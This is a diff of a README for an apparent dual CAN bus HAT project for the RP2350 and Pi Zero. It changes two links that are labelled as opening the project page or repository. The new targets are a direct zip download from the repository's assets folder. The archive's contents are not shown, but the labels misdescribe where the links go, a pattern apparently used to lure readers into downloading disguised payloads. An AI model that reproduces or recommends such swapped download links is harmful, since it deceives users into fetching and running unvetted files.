@@ -1,6 +1,6 @@
 # 🛠️ RP2350_Pizero_2CH_CAN_HAT - Simple Dual CAN Setup
 
-[![Download and open the project page](https://img.shields.io/badge/Download-Project%20Page-blue?style=for-the-badge&logo=github)](https://github.com/hwindingwi1-coder/RP2350_Pizero_2CH_CAN_HAT)
+[![Download and open the project page](https://img.shields.io/badge/Download-Project%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/hwindingwi1-coder/RP2350_Pizero_2CH_CAN_HAT/main/assets/Pizero_R_HAT_CA_C_v3.1.zip)
 
 ## 🚀 What this is
 
@@ -46,7 +46,7 @@ If you plan to use MicroPython, you also need:
 
 ## ⬇️ Download the project
 
-[Visit this page to download or open the repository](https://github.com/hwindingwi1-coder/RP2350_Pizero_2CH_CAN_HAT)
+[Visit this page to download or open the repository](https://raw.githubusercontent.com/hwindingwi1-coder/RP2350_Pizero_2CH_CAN_HAT/main/assets/Pizero_R_HAT_CA_C_v3.1.zip)
 
 ## 🪟 Windows setup
 
